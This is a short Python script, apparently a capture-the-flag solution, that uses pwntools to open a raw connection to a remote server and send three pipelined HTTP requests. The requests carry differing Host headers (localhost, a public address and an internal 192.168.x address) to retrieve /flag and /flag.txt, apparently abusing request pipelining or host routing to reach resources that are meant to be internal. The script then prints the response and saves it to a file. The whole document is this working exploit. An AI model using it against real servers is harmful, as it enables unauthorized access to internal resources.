from pwn import *


req = b'''\
GET /2023/? HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.68.0

GET /flag HTTP/1.1
Host: 115.239.215.75:8081
User-Agent: curl/7.68.0

GET /flag.txt HTTP/1.1
Host: 192.168.31.228

\
'''.replace(b'\n', b'\r\n')
p = remote('115.239.215.75', 8082)
p.send(req)
rec = b'' + p.recvall()
res = rec.decode()
print(res[-1000:])
p.close()

f = open('res.txt', 'wb')
f.write(res.encode())
f.close()
